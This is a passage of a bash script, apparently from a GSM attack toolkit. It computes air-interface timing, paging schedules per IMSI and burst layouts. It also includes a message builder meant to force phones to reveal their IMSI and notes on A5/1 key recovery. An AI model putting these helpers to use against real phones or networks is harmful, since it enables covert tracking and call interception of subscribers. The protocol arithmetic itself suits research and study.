    printf 'message\tIDENTITY_REQUEST\n'
    printf 'octets\t0605%02x\n' "$o3"
    printf 'identity_type\t%s\n' "$type"
    printf 'identity_name\t%s\n' "$(gatk_identity_name "$type")"
    printf 'purpose\t%s\n' "$([[ "$type" -eq 1 ]] && echo "force the MS to reveal its permanent IMSI in the clear" || echo "request a non-permanent identity")"
    return 0
}

gatk_identity_name() {
    case "${1:-}" in
        1) echo "IMSI" ;; 2) echo "IMEI" ;; 3) echo "IMEISV" ;; 4) echo "TMSI" ;;
        *) echo "unknown" ;;
    esac
}

# ── Kc recovery arithmetic (real) ───────────────────────────────────────
# GSM A5/1 keystream budget: one burst is 114 cipher bits; a full frame is
# 228 bits (114 in each direction). The two-known-plaintext attack needs
# 2 frames. COMP128 reduces the effective key from 64 to 54 bits because it
# sets the low 10 bits of Kc to zero.
gatk_kc_recovery_facts() {
    printf 'burst_cipher_bits\t114\n'
    printf 'frame_bits\t228\n'
    printf 'frames_required\t2\n'
    printf 'keystream_bits_required\t456\n'
    printf 'kc_bits\t64\n'
    printf 'kc_effective_bits\t54\n'
    printf 'comp128_zero_bits\t10\n'
    printf 'state_registers\t3\n'
    printf 'register_lengths\t19,22,23\n'
    printf 'state_space_bits\t64\n'
    printf 'useful_keystream_bits_per_frame\t228\n'
    return 0
}

gatk_cmd_kc_recovery() {
    gatk_kc_recovery_facts
    printf 'method\ttwo-known-plaintext (Briceno/Goldberg/Wagner 1998)\n'
    printf 'method_note\t2 frames = 456 known keystream bits; ~2^51 in the original formulation\n'
    printf 'method\trainbow-tables (Nohl 2009)\n'
    printf 'method_note\t1.7 TB of tables, seconds per key once the keystream is known\n'
    printf 'method\tciphertext-only (Barkan/Biham/Keller 2003)\n'
    printf 'method_note\texploits error-correction redundancy; ~2 s of recorded traffic\n'
    printf 'status\tcomputation-only; the capture itself needs an RX SDR\n'
    return 0
}

# ══════════════════════════════════════════════════════════════════════
# Air-interface frame model
#
# Everything in the four vector drivers below is expressed against one clock:
# the GSM TDMA hierarchy from TS 45.010 section 5. Getting this right is what
# makes the transmit schedules real numbers instead of prose, so the numbers
# are derived here from the single primitive that defines the whole system —
# the bit period of 48/13 us — and the selftest asserts the derivations close
# (a frame must equal eight slots, a 26-multiframe must equal 120 ms exactly).
#
#   bit period        48/13 us       = 3.692307... us
#   timeslot          156.25 bits    = 15/26 ms    = 576.923 us
#   TDMA frame        8 timeslots    = 60/13 ms    = 4.615385 ms
#   26-multiframe     26 frames      = 120 ms      (traffic channels)
#   51-multiframe     51 frames      = 235.385 ms  (control channels)
#   superframe        26 * 51 frames = 1326 frames = 6.12 s
#   hyperframe        2048 superframes            = 3.4816 h
# ══════════════════════════════════════════════════════════════════════

# The system's one primitive, kept as an exact fraction so nothing drifts.
GATK_BIT_US_NUM=48
GATK_BIT_US_DEN=13
GATK_SLOT_BITS=156.25
GATK_FRAMES_PER_SUPER=1326      # 26 * 51
GATK_FRAMES_PER_HYPER=2715648   # 2048 * 1326
GATK_MAX_FN=2715647             # hyperframe frame numbers are 0..2715647

gatk_frame_facts() {
    awk -v bn="$GATK_BIT_US_NUM" -v bd="$GATK_BIT_US_DEN" 'BEGIN{
        bit = bn / bd                      # us
        slot = 156.25 * bit
        frame = 8 * slot
        mf26 = 26 * frame
        mf51 = 51 * frame
        super_ = 1326 * frame
        hyper = 2048 * super_
        printf "bit_us\t%.9f\n", bit
        printf "slot_bits\t156.25\n"
        printf "slot_us\t%.6f\n", slot
        printf "frame_slots\t8\n"
        printf "frame_ms\t%.6f\n", frame / 1000
        printf "mf26_frames\t26\n"
        printf "mf26_ms\t%.3f\n", mf26 / 1000
        printf "mf51_frames\t51\n"
        printf "mf51_ms\t%.6f\n", mf51 / 1000
        printf "superframe_frames\t1326\n"
        printf "superframe_ms\t%.1f\n", super_ / 1000
        printf "hyperframe_frames\t2715648\n"
        printf "hyperframe_h\t%.4f\n", hyper / 3600000000
    }'
}

# ── frame number <-> T1/T2/T3 (TS 45.002 section 4.3.3) ────────────────
# The 22-bit frame number is carried over the air as three counters, which is
# what lets a receiver resynchronise after a gap:
#   T1 = FN / 1326         0..2047   11 bits   (superframe)
#   T2 = FN mod 26         0..25      5 bits   (traffic multiframe)
#   T3 = FN mod 51         0..50      6 bits   (control multiframe)
# and recombines as FN = 1326*T1 + 51*((T3 - T2) mod 26) + T3, which is the
# form that recovers the control-multiframe phase T3 from T2.
gatk_fn_split() {   # <frame-number>
    local fn="${1:-}"
    [[ "$fn" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tframe number must be a non-negative integer\n' >&2; return 2; }
    (( fn <= GATK_MAX_FN )) || {
        printf 'ERROR\tframe number %s exceeds the hyperframe maximum %s\n' "$fn" "$GATK_MAX_FN" >&2
        return 2; }
    awk -v fn="$fn" 'BEGIN{
        t1 = int(fn / 1326); t2 = fn % 26; t3 = fn % 51
        printf "fn\t%d\n", fn
        printf "t1\t%d\n", t1
        printf "t2\t%d\n", t2
        printf "t3\t%d\n", t3
        printf "fn_check\t%d\n", 1326 * t1 + 51 * ((t3 - t2 + 26) % 26) + t3
    }'
}

gatk_fn_join() {   # <t1> <t2> <t3>
    local t1="${1:-}" t2="${2:-}" t3="${3:-}"
    [[ "$t1" =~ ^[0-9]+$ && "$t2" =~ ^[0-9]+$ && "$t3" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tT1, T2 and T3 must be non-negative integers\n' >&2; return 2; }
    (( t1 <= 2047 && t2 <= 25 && t3 <= 50 )) || {
        printf 'ERROR\tT1 must be 0..2047, T2 0..25, T3 0..50 (got %s %s %s)\n' \
            "$t1" "$t2" "$t3" >&2; return 2; }
    awk -v t1="$t1" -v t2="$t2" -v t3="$t3" 'BEGIN{
        printf "t1\t%d\nt2\t%d\nt3\t%d\n", t1, t2, t3
        printf "fn\t%d\n", 1326 * t1 + 51 * ((t3 - t2 + 26) % 26) + t3
    }'
}

# Where a frame sits in its multiframes, which is what a scheduler budgets in.
gatk_fn_phase() {   # <frame-number>
    local fn="${1:-}"
    [[ "$fn" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tframe number must be a non-negative integer\n' >&2; return 2; }
    awk -v fn="$fn" -v bn="$GATK_BIT_US_NUM" -v bd="$GATK_BIT_US_DEN" 'BEGIN{
        frame_ms = 8 * 156.25 * (bn / bd) / 1000
        printf "fn\t%d\n", fn
        printf "mf51_index\t%d\n", fn % 51
        printf "mf26_index\t%d\n", fn % 26
        printf "superframe_index\t%d\n", fn % 1326
        printf "superframe_no\t%d\n", int(fn / 1326)
        printf "time_ms\t%.3f\n", fn * frame_ms
    }'
}

# ── timing advance (TS 45.010 section 5.5) ─────────────────────────────
# The MS advances its uplink by TA bit periods so its burst lands in the
# right slot at the BTS. One TA step is one bit period of round-trip path,
# so the one-way range is c * (48/13 us) / 2.
gatk_ta() {   # <units> [gsm400]
    local units="${1:-0}" band="${2:-}"
    [[ "$units" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tTA must be a whole number of bit periods\n' >&2; return 2; }
    # TS 45.010 5.5: TAmax = 63 for every band except GSM 400, where the
    # extended timing advance information element raises it to 219.
    local max=63
    [[ "$band" == "gsm400" || "$band" == "1" ]] && max=219
    (( units <= max )) || {
        printf 'ERROR\tTA %s exceeds the maximum of %s%s\n' \
            "$units" "$max" "$([[ $max == 63 ]] && echo ' (GSM 400 allows 219)' || echo '')" >&2
        return 2; }
    awk -v ta="$units" -v mx="$max" -v bn="$GATK_BIT_US_NUM" -v bd="$GATK_BIT_US_DEN" 'BEGIN{
        c = 299792458.0
        bit_us = bn / bd                    # TS 45.010 3: the normal symbol period 48/13 us
        rt_us = ta * bit_us                 # round-trip delay, one symbol period per TA step
        rng = c * (rt_us * 1e-6) / 2.0      # one-way, metres
        printf "ta_units\t%d\n", ta
        printf "bit_us\t%.9f\n", bit_us
        printf "roundtrip_us\t%.6f\n", rt_us
        printf "one_way_m\t%.2f\n", rng
        printf "max_ta\t%d\n", mx
        printf "max_one_way_m\t%.0f\n", c * (mx * bit_us * 1e-6) / 2.0
        printf "advance_symbols\t%.2f\n", 468.75 - ta
        printf "note\tTS 45.010 6.4: the MS transmits 468.75 - TA symbol periods behind\n"
        printf "note\tTS 45.010 5.4.1: the BTS rounds the measured RACH delay to the\n"
        printf "note\tnearest normal symbol period, so the quantisation alone leaves up\n"
        printf "note\tto half a step (about %.0f m) of residual error.\n", c * (0.5 * bit_us * 1e-6) / 2.0
    }'
}

# ── the 51-multiframe map on timeslot 0 (TS 45.002 Table 3) ─────────────
# The control-channel multiframe is 51 frames long and its TS0 layout is
# fixed, not signalled. Every offset below is a frame number modulo 51, so a
# transmitter does not need to negotiate anything to know where to be:
#
#   offset  0     10     20     30     40     FCCH  (frequency correction)
#   offset  1     11     21     31     41     SCH   (BSIC + frame number)
#   offset  2..5                              BCCH Norm
#   offset  6..9 12..15 16..19 22..25 26..29  CCCH blocks 0..4
#          32..35 36..39 42..45 46..49        CCCH blocks 5..8
#   offset 50                                 idle
#
# The nine CCCH blocks are the whole point: PCH and AGCH share them, and
# BS_AG_BLKS_RES of them, counted from block 0, are reserved for AGCH.
GATK_FCCH_OFFSETS=(0 10 20 30 40)
GATK_SCH_OFFSETS=(1 11 21 31 41)
GATK_BCCH_OFFSETS=(2 3 4 5)
GATK_CCCH_FIRST=(6 12 16 22 26 32 36 42 46)
GATK_CCCH_BLOCKS=9
GATK_CCCH_BURSTS=4

# Table 3 lists the CCCH blocks as B0(6..9) B1(12..15) B2(16..19) B3(22..25)
# B4(26..29) B5(32..35) B6(36..39) B7(42..45) B8(46..49).
GATK_CCCH_FRAME_TABLE='6 12 16 22 26 32 36 42 46'

gatk_ccch_first() {   # <block 0..8> -> first frame offset in the 51-multiframe
    local k="${1:-}"
    [[ "$k" =~ ^[0-9]+$ ]] && (( k >= 0 && k < GATK_CCCH_BLOCKS )) || return 2
    set -- $GATK_CCCH_FRAME_TABLE
    printf '%s' "${@:$((k + 1)):1}"
}

gatk_multiframe_map() {
    printf 'offset\tchannel\tdirection\ttimeslot\tburst\tnote\n'
    local f k first
    for f in "${GATK_FCCH_OFFSETS[@]}"; do
        printf '%d\tFCCH\tDL\t0\tFB\tfrequency correction burst, +1625/24 kHz offset\n' "$f"
    done
    for f in "${GATK_SCH_OFFSETS[@]}"; do
        printf '%d\tSCH\tDL\t0\tSB\tsynchronisation burst: BSIC + reduced frame number\n' "$f"
    done
    for f in "${GATK_BCCH_OFFSETS[@]}"; do
        printf '%d\tBCCH\tDL\t0\tNB\tSI1..SI4 / SI13 cycle\n' "$f"
    done
    for (( k = 0; k < GATK_CCCH_BLOCKS; k++ )); do
        first=$(gatk_ccch_first "$k")
        printf '%d..%d\tCCCH\tDL\t0\tNB\tblock %d (PCH and AGCH)\n' \
            "$first" "$(( first + GATK_CCCH_BURSTS - 1 ))" "$k"
    done
    printf '50\tidle\t-\t0\t-\tunused\n'
}

# BS_AG_BLKS_RES reserves access-grant blocks from block 0 upward, so the
# paging blocks are the tail of the CCCH block list.
# ── CCCH_CONF: how many CCCHs, and whether SDCCH/4 shares the channel ───
# TS 45.002 section 3.3.2.3 a). The BCCH advertises a 3-bit CCCH_CONF and
# everything downstream — how many blocks the paging arithmetic may use, and
# which TDMA frames carry RACH — follows from it. Getting this wrong is not a
# rounding error: on a combined cell (CCCH_CONF = 001, the usual configuration
# for a small or indoor BTS) there are only THREE CCCH blocks in the
# 51-multiframe, so paging-group arithmetic run against nine blocks lands on a
# frame that is carrying SDCCH/4.
gatk_ccch_conf() {   # <ccch-conf 000|001|010|100|110>
    local c="${1:-000}"
    case "$c" in
        000) printf 'ccch_conf\t000\nbs_cc_chans\t1\nbs_ccch_sdcch_comb\tfalse\npaging_blocks_max\t9\nnote\tsingle CCCH, no SDCCH/4 sharing\n' ;;
        001) printf 'ccch_conf\t001\nbs_cc_chans\t1\nbs_ccch_sdcch_comb\ttrue\npaging_blocks_max\t3\nnote\tCCCH shared with SDCCH/4(0..3)+SACCH/C4(0..3): 3 blocks only\n' ;;
        010) printf 'ccch_conf\t010\nbs_cc_chans\t2\nbs_ccch_sdcch_comb\tfalse\npaging_blocks_max\t9\nnote\ttwo CCCHs on timeslots 0 and 2\n' ;;
        100) printf 'ccch_conf\t100\nbs_cc_chans\t3\nbs_ccch_sdcch_comb\tfalse\npaging_blocks_max\t9\nnote\tthree CCCHs on timeslots 0, 2 and 4\n' ;;
        110) printf 'ccch_conf\t110\nbs_cc_chans\t4\nbs_ccch_sdcch_comb\tfalse\npaging_blocks_max\t9\nnote\tfour CCCHs on timeslots 0, 2, 4 and 6\n' ;;
        *)   printf 'ERROR\tCCCH_CONF must be 000, 001, 010, 100 or 110 (got %s)\n' "$c" >&2; return 2 ;;
    esac
}

# TS 45.002 Table 5, clause 7. In the combined configuration only B0, B1 and
# B2 remain common control blocks; B3..B8 carry SDCCH/4(0..3) at frames
# 22..39 and SACCH/C4(0..3) at 42..49, which is exactly what Table 4 maps
# those blocks to. The first three entries of the normal CCCH frame table are
# 6, 12, 16 — B0, B1, B2 — so the arithmetic below is unchanged, but the
# *ceiling* on BS_AG_BLKS_RES and on the paging block count is 3, not 9.
GATK_CCCH_COMB_BLOCKS=3

gatk_ccch_blocks_available() {   # [combined true|false]
    local comb="${1:-false}"
    if [[ "$comb" == true ]]; then echo "$GATK_CCCH_COMB_BLOCKS"; else echo "$GATK_CCCH_BLOCKS"; fi
}

# TS 45.002 Table 5, clause 7, "Random access channel blocks available".
# Not combined: every TDMA frame B0..B50 carries a RACH opportunity on the
# uplink. Combined: the uplink half of TS0 is taken by SDCCH/4 UL
# B(37..40),(41..44),(47..50),(0..3) and SACCH/C4 UL B(57..60),(61..64) —
# i.e. frames 6..13 modulo 51 — leaving 4, 5, 14..36, 45 and 46. That is the
# list the table elides as "B4, B5, B14, B15 ... B36, B45, B46": 27 frames.
gatk_rach_blocks() {   # [combined true|false]
    local comb="${1:-false}" f
    printf 'combined\t%s\n' "$comb"
    printf 'frame_count\t'
    if [[ "$comb" == true ]]; then echo 27; else echo 51; fi
    printf 'frame\n'
    if [[ "$comb" == true ]]; then
        for f in 4 5; do printf '%d\n' "$f"; done
        for (( f = 14; f <= 36; f++ )); do printf '%d\n' "$f"; done
        for f in 45 46; do printf '%d\n' "$f"; done
    else
        for (( f = 0; f <= 50; f++ )); do printf '%d\n' "$f"; done
    fi
}

gatk_ccch_blocks() {   # [bs-ag-blks-res 0..7] [combined true|false]
    local res="${1:-0}" comb="${2:-false}"
    [[ "$res" =~ ^[0-9]+$ ]] && (( res <= 7 )) || {
        printf 'ERROR\tBS_AG_BLKS_RES must be 0..7 (got %s)\n' "$res" >&2; return 2; }
    [[ "$comb" == true || "$comb" == false ]] || {
        printf 'ERROR\tcombined must be true or false (got %s)\n' "$comb" >&2; return 2; }
    local nblocks; nblocks=$(gatk_ccch_blocks_available "$comb")
    (( res < nblocks )) || {
        printf 'ERROR\tBS_AG_BLKS_RES %s leaves no paging blocks in %s CCCH blocks%s\n' \
            "$res" "$nblocks" "$([[ "$comb" == true ]] && echo ' (combined with SDCCH/4)')" >&2
        return 2; }
    printf 'combined\t%s\n' "$comb"
    printf 'ccch_blocks\t%s\n' "$nblocks"
    printf 'block\tfirst_frame\tlast_frame\trole\n'
    local k first role
    for (( k = 0; k < nblocks; k++ )); do
        first=$(gatk_ccch_first "$k")
        if (( k < res )); then role='AGCH-only (reserved)'; else role='PCH or AGCH'; fi
        printf '%d\t%d\t%d\t%s\n' "$k" "$first" \
            "$(( first + GATK_CCCH_BURSTS - 1 ))" "$role"
    done
}

# ── paging group arithmetic (TS 45.002 section 6.5.2, idle mode, non-eDRX) ──
#   CCCH_GROUP   (0 .. BS_CC_CHANS-1) = ((IMSI mod 1000) mod (BS_CC_CHANS x N)) div N
#   PAGING_GROUP (0 .. N-1)           = ((IMSI mod 1000) mod (BS_CC_CHANS x N)) mod N
#   N = (paging blocks available per 51-multiframe on one CCCH) x BS_PA_MFRMS
#
# Note the modulus is 1000, not 1024. The last three digits of the IMSI are
# taken directly so the value is exact regardless of shell arithmetic width.
gatk_paging_group() {   # <imsi 6..15 digits> <bs-pa-mfrms 2..9> <paging-blocks-per-51mf 1..9> [bs-cc-chans 1..4] [combined true|false]
    local imsi="${1:-}" pam="${2:-}" pblocks="${3:-}" chans="${4:-1}" comb="${5:-false}"
    [[ "$imsi" =~ ^[0-9]{6,15}$ ]] || {
        printf 'ERROR\tIMSI must be 6 to 15 digits (got %s)\n' "$imsi" >&2; return 2; }
    [[ "$pam" =~ ^[0-9]+$ ]] && (( pam >= 2 && pam <= 9 )) || {
        printf 'ERROR\tBS_PA_MFRMS must be 2..9 (got %s)\n' "$pam" >&2; return 2; }
    [[ "$comb" == true || "$comb" == false ]] || {
        printf 'ERROR\tcombined must be true or false (got %s)\n' "$comb" >&2; return 2; }
    local maxb; maxb=$(gatk_ccch_blocks_available "$comb")
    [[ "$pblocks" =~ ^[0-9]+$ ]] && (( pblocks >= 1 && pblocks <= maxb )) || {
        printf 'ERROR\tpaging blocks per 51-multiframe must be 1..%s (got %s)%s\n' \
            "$maxb" "$pblocks" \
            "$([[ "$comb" == true ]] && echo ' — combined with SDCCH/4 leaves only 3 CCCH blocks')" >&2
        return 2; }
    [[ "$chans" =~ ^[0-9]+$ ]] && (( chans >= 1 && chans <= 4 )) || {
        printf 'ERROR\tBS_CC_CHANS must be 1..4 (got %s)\n' "$chans" >&2; return 2; }
    awk -v t3="$(( 10#${imsi: -3} ))" -v pam="$pam" -v pb="$pblocks" -v c="$chans" -v comb="$comb" 'BEGIN{
        N = pb * pam
        x = t3 % (c * N)
        printf "imsi_mod_1000\t%d\n", t3
        printf "bs_cc_chans\t%d\n", c
        printf "bs_pa_mfrms\t%d\n", pam
        printf "paging_blocks_per_mf\t%d\n", pb
        printf "bs_ccch_sdcch_comb\t%s\n", comb
        printf "N\t%d\n", N
        printf "ccch_group\t%d\n", int(x / N)
        printf "paging_group\t%d\n", x % N
    }'
}

# ── which multiframe and which block (TS 45.002 section 6.5.3) ───────────
#   the required 51-multiframe has   (FN div 51) mod BS_PA_MFRMS = PAGING_GROUP div (N div BS_PA_MFRMS)
#   and the block within it is       PAGING_GROUP mod (N div BS_PA_MFRMS)
# N div BS_PA_MFRMS is just the number of paging blocks per multiframe, so the
# cycle position is PAGING_GROUP div pblocks and the block index is
# PAGING_GROUP mod pblocks. The block index is then offset past the AGCH
# blocks reserved at the head of the CCCH.
gatk_paging_schedule() {   # <imsi> <bs-pa-mfrms> <bs-ag-blks-res> <paging-blocks-per-51mf> [bs-cc-chans] [start-fn] [combined]
    local imsi="${1:-}" pam="${2:-}" res="${3:-0}" pblocks="${4:-}" chans="${5:-1}" start="${6:-0}" comb="${7:-false}"
    [[ "$res" =~ ^[0-9]+$ ]] && (( res <= 7 )) || {
        printf 'ERROR\tBS_AG_BLKS_RES must be 0..7 (got %s)\n' "$res" >&2; return 2; }
    [[ "$start" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tstart frame must be a non-negative integer\n' >&2; return 2; }
    local grp
    grp=$(gatk_paging_group "$imsi" "$pam" "$pblocks" "$chans" "$comb") || return $?
    local pg pb cg nblocks
    pg=$(printf '%s\n' "$grp" | awk -F'\t' '$1=="paging_group"{print $2}')
    cg=$(printf '%s\n' "$grp" | awk -F'\t' '$1=="ccch_group"{print $2}')
    nblocks=$(gatk_ccch_blocks_available "$comb")
    (( pg % pblocks + res < nblocks )) || {
        printf 'ERROR\tpaging block %s + %s reserved AGCH blocks exceeds the %s CCCH blocks\n' \
            "$(( pg % pblocks ))" "$res" "$nblocks" >&2; return 2; }
    awk -v pg="$pg" -v cg="$cg" -v pb="$pblocks" -v pam="$pam" -v res="$res" \
        -v firsts="$GATK_CCCH_FRAME_TABLE" -v start="$start" -v comb="$comb" 'BEGIN{
        split(firsts, F, " ")
        mf_index = int(pg / pb)              # position in the BS_PA_MFRMS cycle
        blk_in_mf = pg % pb                  # paging block within the multiframe
        ccch_block = blk_in_mf + res         # offset past the reserved AGCH blocks
        f0 = F[ccch_block + 1]
        printf "paging_group\t%d\n", pg
        printf "ccch_group\t%d\n", cg
        printf "bs_ccch_sdcch_comb\t%s\n", comb
        printf "multiframe_index\t%d\n", mf_index
        printf "cycle_multiframes\t%d\n", pam
        printf "paging_block_index\t%d\n", blk_in_mf
        printf "ccch_block\t%d\n", ccch_block
        printf "block_first_offset\t%d\n", f0
        printf "block_last_offset\t%d\n", f0 + 3
        # First absolute frame at or after `start` whose multiframe is in the
        # right cycle position. (FN div 51) mod pam must equal mf_index.
        base = int(start / 51)
        k = base
        while ((k % pam) != mf_index) k++
        # walk three paging occasions so the operator sees the period
        for (i = 0; i < 3; i++) {
            fn = 51 * (k + i * pam) + f0
            printf "occasion%d_first_fn\t%d\n", i + 1, fn
            printf "occasion%d_last_fn\t%d\n", i + 1, fn + 3
            printf "occasion%d_first_ms\t%.3f\n", i + 1, fn * 8 * 156.25 * 48 / 13 / 1000
        }
        printf "period_frames\t%d\n", 51 * pam
        printf "period_ms\t%.1f\n", 51 * pam * 8 * 156.25 * 48 / 13 / 1000
    }'
}

# ── dedicated channel block mapping (TS 45.002 Tables 3 and 4) ──────────
gatk_sdcch_map() {   # [4|8] — SDCCH/4 is the combined BCCH+SDCCH layout
    local kind="${1:-4}"
    case "$kind" in
        4) cat <<'EOF'
subchannel	direction	block_offsets	note
0	DL	22..25	combined CCCH+SDCCH/4 on TS0
0	UL	37..40	combined CCCH+SDCCH/4 on TS0
1	DL	26..29	combined CCCH+SDCCH/4 on TS0
1	UL	41..44	combined CCCH+SDCCH/4 on TS0
2	DL	32..35	combined CCCH+SDCCH/4 on TS0
2	UL	47..50	combined CCCH+SDCCH/4 on TS0
3	DL	36..39	combined CCCH+SDCCH/4 on TS0
3	UL	0..3	wraps into the next 51-multiframe
EOF
            ;;
        8) cat <<'EOF'
subchannel	direction	block_offsets	note
0	DL	0..3	dedicated SDCCH/8, TS0..7
0	UL	15..18	dedicated SDCCH/8, TS0..7
1	DL	4..7	dedicated SDCCH/8, TS0..7
1	UL	19..22	dedicated SDCCH/8, TS0..7
2	DL	8..11	dedicated SDCCH/8, TS0..7
2	UL	23..26	dedicated SDCCH/8, TS0..7
3	DL	12..15	dedicated SDCCH/8, TS0..7
3	UL	27..30	dedicated SDCCH/8, TS0..7
4	DL	16..19	dedicated SDCCH/8, TS0..7
4	UL	31..34	dedicated SDCCH/8, TS0..7
5	DL	20..23	dedicated SDCCH/8, TS0..7
5	UL	35..38	dedicated SDCCH/8, TS0..7
6	DL	24..27	dedicated SDCCH/8, TS0..7
6	UL	39..42	dedicated SDCCH/8, TS0..7
7	DL	28..31	dedicated SDCCH/8, TS0..7
7	UL	43..46	dedicated SDCCH/8, TS0..7
EOF
            ;;
        *) printf 'ERROR\tSDCCH kind must be 4 or 8 (got %s)\n' "$kind" >&2; return 2 ;;
    esac
}

# Which 51-multiframe offsets carry a given SDCCH sub-channel, downlink.
gatk_sdcch_block_frames() {   # <4|8> <subchannel>
    local kind="${1:-4}" sub="${2:-0}" dl ul
    if [[ "$kind" == 4 ]]; then
        [[ "$sub" =~ ^[0-3]$ ]] || { printf 'ERROR\tSDCCH/4 sub-channel must be 0..3\n' >&2; return 2; }
        case "$sub" in
            0) dl='22 23 24 25'; ul='37 38 39 40' ;;
            1) dl='26 27 28 29'; ul='41 42 43 44' ;;
            2) dl='32 33 34 35'; ul='47 48 49 50' ;;
            3) dl='36 37 38 39'; ul='0 1 2 3' ;;
        esac
    else
        [[ "$sub" =~ ^[0-7]$ ]] || { printf 'ERROR\tSDCCH/8 sub-channel must be 0..7\n' >&2; return 2; }
        local o=$(( sub * 4 ))
        set -- $o $(( o + 1 )) $(( o + 2 )) $(( o + 3 ))
        dl="$1 $2 $3 $4"
        set -- $(( o + 15 )) $(( o + 16 )) $(( o + 17 )) $(( o + 18 ))
        ul="$1 $2 $3 $4"
    fi
    printf 'sdcch\t%s\nsubchannel\t%s\n' "$kind" "$sub"
    printf 'dl_offsets\t%s\nul_offsets\t%s\n' "$dl" "$ul"
    printf 'bursts_per_block\t4\n'
}

# ── the SCH payload (TS 45.002 section 3.3.2.2.1) ───────────────────────
# 25 information bits before channel coding: BSIC (6) plus the reduced TDMA
# frame number RFN (19) = T1 (11) | T2 (5) | T3' (3).
#     T1  = FN div 1326        T2 = FN mod 26
#     T3  = FN mod 51          T3' = (T3 - 1) div 10
# T3' is only three bits, which would be lossy, except that the SCH is only
# ever transmitted on multiframe offsets 1, 11, 21, 31, 41 — and those are
# exactly the frames with T3 = 1, 11, 21, 31, 41, so T3' is lossless there and
# TS 45.010 section 5.5 recovers T3 = 10 * T3' + 1 exactly.
gatk_sch_payload() {   # <bsic 0..63> <frame-number>
    local bsic="${1:-}" fn="${2:-}"
    [[ "$bsic" =~ ^[0-9]+$ ]] && (( bsic <= 63 )) || {
        printf 'ERROR\tBSIC must be 0..63 (got %s)\n' "$bsic" >&2; return 2; }
    [[ "$fn" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tframe number must be a non-negative integer\n' >&2; return 2; }
    (( fn <= GATK_MAX_FN )) || {
        printf 'ERROR\tframe number %s exceeds the hyperframe maximum %s\n' "$fn" "$GATK_MAX_FN" >&2
        return 2; }
    # The SCH is only transmitted where T3 = FN mod 51 is one of 1, 11, 21, 31
    # or 41 — the frames the 51-multiframe map puts on the synchronisation
    # channel. T3' is lossy by construction: (T3-1) div 10 maps the whole
    # decade 1..10, 11..20, ... onto one 3-bit code, so a receiver recovers
    # the decade's *first* frame, not whatever frame it happened to be given.
    # That is why the payload is computed for the SCH frame and the answer
    # says so; handing this function a traffic frame is a caller error, and
    # it exits non-zero rather than quietly returning a different FN.
    local out rc
    out=$(awk -v bsic="$bsic" -v fn="$fn" 'BEGIN{
        t1 = int(fn / 1326); t2 = fn % 26; t3 = fn % 51
        t3p = int((t3 - 1) / 10); if (t3p < 0) t3p = 0
        sch_t3 = 10 * t3p + 1
        # The SCH frame keeps T1 and T2 and only moves T3 within its decade.
        b_sch = (sch_t3 - t2 + 26) % 26
        sch_fn = 1326 * t1 + 51 * b_sch + sch_t3
        # BSIC (6 bits) then RFN = T1(11) | T2(5) | T3p(3) = 25 bits, MSB first.
        rfn = t1 * 256 + t2 * 8 + t3p
        v = bsic * 524288 + rfn
        bits = ""
        for (i = 24; i >= 0; i--) bits = bits ((int(v / (2 ^ i)) % 2) ? "1" : "0")
        printf "bsic\t%d\n", bsic
        printf "plmn_colour_code\t%d\n", int(bsic / 8)
        printf "bs_colour_code\t%d\n", bsic % 8
        printf "frame_number\t%d\n", fn
        printf "t1\t%d\nt2\t%d\nt3\t%d\nt3p\t%d\n", t1, t2, t3, t3p
        printf "rfn\t%d\n", rfn
        # Two orderings, because they are different and the difference is
        # silent: the figure draws the field as octet columns 8..1, while the
        # radio transmits bit 1 of each octet first (TS 44.004 7.10). Handing
        # the column order to a burst builder reverses every octet.
        tx = ""
        for (o = 0; o < 3; o++) {
            for (b = 0; b < 8; b++) tx = tx substr(bits, o * 8 + (8 - b), 1)
        }
        tx = tx substr(bits, 25, 1)
        printf "sch_bits\t%s\n", bits
        printf "sch_bits_order\tfigure 9.1.30a.1 column order, octet bit 8 first\n"
        printf "sch_bits_tx\t%s\n", tx
        printf "sch_bits_tx_order\tTS 44.004 7.10 transmission order, octet bit 1 first\n"
        printf "sch_info_hex\t%07x\n", v
        printf "sch_info_octets\t%08x\n", v * 128
        printf "sch_info_bits\t25\n"
        printf "input_is_sch_frame\t%s\n", (t3 >= 1 && (t3 - 1) % 10 == 0) ? "yes" : "no"
        printf "sch_frame_t3\t%d\n", sch_t3
        printf "sch_frame_fn\t%d\n", sch_fn
        printf "recovered_fn\t%d\n", sch_fn
        if (!(t3 >= 1 && (t3 - 1) % 10 == 0)) {
            printf "note\tFN %d carries no SCH; the payload above belongs to SCH frame %d\n", fn, sch_fn
            exit 1
        }
    }')
    rc=$?
    printf '%s\n' "$out"
    if (( rc != 0 )); then
        printf 'ERROR\tframe %s is not an SCH frame (T3 must be 1, 11, 21, 31 or 41); the SCH payload was computed for frame %s\n' \
            "$fn" "$(printf '%s\n' "$out" | awk -F'\t' '$1=="sch_frame_fn"{print $2}')" >&2
    fi
    return $rc
}

# ── burst layouts (TS 45.002 sections 5.2.3 to 5.2.7) ───────────────────
# The 156.25-bit slot is shared by four burst shapes. The one that gets used
# decides where the training sequence sits and how much guard is left, which
# is exactly what a transmitter has to get right.
gatk_burst_layout() {   # <normal|sync|access|frequency>
    local kind="${1:-normal}"
    case "$kind" in
        normal) cat <<'EOF'
burst	normal	NB
field	bits	length	note
tail	0..2	3	(0,0,0)
data	3..59	57	encrypted e0..e56
stealing	60	1	hl(B): status of the even-numbered bits
training	61..86	26	TSC from the cell's BSIC (set 1 for BCCH/CCCH)
stealing	87	1	hu(B): status of the odd-numbered bits
data	88..144	57	encrypted e57..e113
tail	145..147	3	(0,0,0)
guard	148..156	8.25	normal guard
data_bits	114
stealing_bits	2
note	TS 45.002 table 5.2.3-1 groups bits 3..60 and 87..144 as two fields of
note	58 "encrypted bits" each. Those 58-bit groups COUNT THE STEALING FLAG
note	INSIDE THEM: TS 45.003 3.1.4 sets e(B,57) = hl(B) and e(B,58) = hu(B),
note	so the burst carries 114 encrypted bits plus two flags, not 116 data
note	bits. A model that treats all 116 positions as data puts the training
note	sequence and every subsequent bit two positions out.
note	For TCH/FS not stolen for signalling, hu(B) = 0 on the first four bursts
note	of a block and hl(B) = 0 on the last four.
EOF
            ;;
        sync) cat <<'EOF'
burst	sync	SB
field	bits	length	note
tail	0..2	3	(0,0,0)
data	3..41	39	encrypted e0..e38
